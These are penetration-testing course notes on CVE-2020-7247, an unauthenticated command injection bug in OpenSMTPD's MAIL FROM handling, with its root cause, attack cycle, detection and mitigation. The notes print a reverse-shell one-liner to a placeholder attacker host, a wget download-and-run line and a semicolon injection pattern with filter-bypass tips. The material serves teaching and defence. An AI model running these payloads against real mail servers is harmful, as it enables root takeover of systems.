## ID
115

## Module
Attacking Common Services

## Kind
notes

## Title
Section 16 — Latest Email Service Vulnerabilities

## Description
CVE-2020-7247 – a critical remote code execution vulnerability in OpenSMTPD (versions up to 6.6.2) that allows unauthenticated attackers to execute arbitrary system commands via a semicolon escape in the MAIL FROM field.

## Tags
theory, vulnerability, smtp, rce, opensmtpd, cve

## TL;DR — What's Important
- **CVE-2020-7247** affects OpenSMTPD versions ≤ 6.6.2, a popular SMTP server on Linux/BSD (Debian, Fedora, FreeBSD).
- **No authentication required** – the vulnerability is triggered during the MAIL FROM command, before any recipient or data is sent.
- **Root cause:** Improper input sanitization in the MAIL FROM parsing function. A semicolon (`;`) allows command injection, escaping the intended address handling.
- **Character limit:** Commands are limited to 64 characters – enough for a reverse shell one‑liner or a wget payload.
- **Privileges:** OpenSMTPD binds to port 25 (requires root), and the vulnerable process runs with elevated privileges – successful exploitation yields root access.
- **Attack cycle:** Source = crafted MAIL FROM field → Process = address parsing → Privileges = root → Destination = local command execution (first cycle), then second cycle sends reverse shell to attacker.

## Concept Overview
OpenSMTPD is a lightweight SMTP server used in many Unix‑like operating systems. In versions up to 6.6.2, a vulnerability was discovered in the `smtp_mailaddr` function, which handles the MAIL FROM command. An attacker can inject a semicolon followed by a system command in the sender address. Due to insufficient validation, the semicolon acts as a command separator, and the injected command is executed by the system with the privileges of the OpenSMTPD process (typically root, because the service binds to privileged port 25). The command length is limited to 64 characters, but that is sufficient for a reverse shell payload (e.g., `sh -i >& /dev/tcp/attacker_ip/port 0>&1` or a wget download of a larger payload). The vulnerability was patched in OpenSMTPD 6.6.4.

## Key Concepts

### Command Injection via Semicolon
- In many Unix shells, a semicolon (`;`) separates multiple commands on one line.
- If user input is passed unsanitized to a shell, an attacker can inject `; <malicious_command>` to execute arbitrary commands.
- In CVE-2020-7247, the MAIL FROM field is concatenated into a shell command without proper escaping, allowing the semicolon to break out.

### Affected Systems
- OpenSMTPD versions 6.6.0, 6.6.1, 6.6.2 (and possibly earlier)
- Linux distributions: Debian, Fedora, Ubuntu (with backported packages), FreeBSD, OpenBSD (though OpenBSD patched quickly)
- Shodan shows >5,000 publicly accessible OpenSMTPD servers (as of 2022), many still vulnerable.

### Attack Cycle (as described in the module)

**First cycle – injecting the command:**

| Step | Action | Concept Category |
|------|--------|------------------|
| 1 | Attacker connects to SMTP and issues `MAIL FROM:<attacker@example.com; cmd>` | Source (user input) |
| 2 | OpenSMTPD processes the MAIL FROM command, passing the address to a parsing function | Process |
| 3 | The service runs with root privileges (binds to port 25) | Privileges |
| 4 | The command is passed to a local process for execution | Destination (local) |

**Second cycle – RCE:**

| Step | Action | Concept Category |
|------|--------|------------------|
| 5 | The injected command (after the semicolon) becomes the Source | Source |
| 6 | The shell interprets the semicolon as a command separator, executing the attacker’s command | Process |
| 7 | The command runs with root privileges (inherited from the SMTP process) | Privileges |
| 8 | The attacker receives a reverse shell or other access | Destination (network) |

### Exploit Constraints
- Maximum command length: 64 characters (including the semicolon and any spaces). This limits payloads but is sufficient for:
  - Reverse shell: `sh -i >& /dev/tcp/10.0.0.1/4444 0>&1` (fits)
  - Download and execute: `wget 10.0.0.1/p -O /tmp/x;sh /tmp/x` (fits)
- The command is executed in the context of the SMTP server – usually root.

## Why It Matters
- OpenSMTPD is a popular, lightweight alternative to Sendmail/Postfix, especially in BSD and embedded systems.
- The vulnerability requires no credentials – any attacker who can reach port 25 can exploit it.
- RCE with root privileges means full system compromise.
- The 64‑character limit is not a serious barrier; creative one‑liners easily fit.
- Over 5,000 public servers were exposed at the time of disclosure, and many remain unpatched due to legacy infrastructure.

## Defender Perspective
- **Detection:** Monitor SMTP logs for unusual MAIL FROM strings containing semicolons (`;`), backticks (`), or command substitution syntax (`$(…)`). Look for outbound connections from the SMTP server to unexpected IPs (reverse shells). Use IDS/IPS signatures for CVE-2020-7247.
- **Mitigation:**  
  - Upgrade OpenSMTPD to version 6.6.4 or later.  
  - If patching is not possible, restrict SMTP access to trusted IPs only (firewall rules).  
  - Run OpenSMTPD in a chroot or container to limit impact of RCE.  
  - Monitor for the vulnerable version banner (`220` response often includes version).
- **MITRE ATT&CK:** T1190 (Exploit Public‑Facing Application), T1059 (Command and Scripting Interpreter), T1043 (Commonly Used Port – port 25).

## Key Takeaways
- Email services are not just for spamming – they can be a direct path to RCE.
- Always check the SMTP banner for version information. OpenSMTPD < 6.6.3 is highly suspicious.
- Command injection via semicolon is a classic pattern. If you see user input passed to a shell, always test `; id`.
- The 64‑character limit teaches an important lesson: even constrained payloads can be effective. Reverse shells, downloaders, and pingbacks all fit.
- Shodan trends show that vulnerable services persist for years after a patch is released – don’t assume a service is safe just because it’s old.

## Gotchas
- The vulnerability only works on the **MAIL FROM** command, not the RCPT TO or DATA fields.
- Some installations may not run OpenSMTPD as root (e.g., if they use port forwarding or run on a non‑standard port). Check privileges before assuming root access.
- The semicolon injection may be URL‑encoded or otherwise filtered. Try `%3b` or newline (`%0a`) if needed.
- Public exploits exist (Exploit‑DB), but they may require adjustments for different architectures (32‑bit vs 64‑bit).
- After exploitation, the SMTP service may crash or become unstable – be prepared for disruption in production assessments.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|common-services]]  
← [[15-attacking-email-services]] | [[17-skills-assessment-easy]] →
<!-- AUTO-LINKS-END -->
